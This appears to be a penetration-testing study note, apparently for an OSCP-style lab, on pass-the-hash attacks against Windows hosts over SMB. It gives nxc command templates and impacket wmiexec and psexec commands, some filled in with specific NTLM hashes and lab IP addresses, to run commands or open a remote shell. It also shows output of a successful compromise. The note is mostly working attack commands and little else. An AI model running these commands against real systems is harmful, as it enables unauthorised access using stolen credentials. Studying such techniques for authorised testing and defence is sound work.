##### Requirements
Hash required: LM, NTLM
The target machine needs to have an open SMB port (usually 445).
The target machine needs to have **Windows File and Printer Sharing** enabled.

Method: [[Extract hash from SAM,SYSTEM]], or use found hashes. Confirm type with hash-identifier.


### Using SMB
```
nxc smb TARGET_IP -u USER -H 'NTLM_HASH' -x COMMAND
```
###### Example output
```
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #nxc smb 192.168.187.226 -u itwk04admin -H '445414c16b5689513d4ad8234391aacf' -x ipconfig
SMB         192.168.187.226 445    ITWK04           [*] Windows 10.0 Build 22000 x64 (name:ITWK04) (domain:itwk04) (signing:False) (SMBv1:False)
SMB         192.168.187.226 445    ITWK04           [+] itwk04\itwk04admin:445414c16b5689513d4ad8234391aacf (Pwn3d!)
SMB         192.168.187.226 445    ITWK04           [+] Executed command via wmiexec
SMB         192.168.187.226 445    ITWK04           Windows IP Configuration
SMB         192.168.187.226 445    ITWK04           
SMB         192.168.187.226 445    ITWK04           
SMB         192.168.187.226 445    ITWK04           Ethernet adapter Ethernet0:
SMB         192.168.187.226 445    ITWK04           
SMB         192.168.187.226 445    ITWK04           Connection-specific DNS Suffix  . :
SMB         192.168.187.226 445    ITWK04           Link-local IPv6 Address . . . . . : fe80::89f1:b602:3e16:f298%2
SMB         192.168.187.226 445    ITWK04           IPv4 Address. . . . . . . . . . . : 192.168.187.226
SMB         192.168.187.226 445    ITWK04           Subnet Mask . . . . . . . . . . . : 255.255.255.0
SMB         192.168.187.226 445    ITWK04           Default Gateway . . . . . . . . . : 192.168.187.254

```


Connect to machine using impacket's wmiexec.py:
```
cp /usr/share/doc/python3-impacket/examples/wmiexec.py . // Default location on Parrot OS
python3 wmiexec.py -hashes LM_HASH:NTLM_HASH USER@TARGET_IP   // Spawns a semi-interactive Windows shell

OR 
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
OR
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
Note: Don't forget to replace USER with admin when using admin hashes.

Alternatively, use WinRM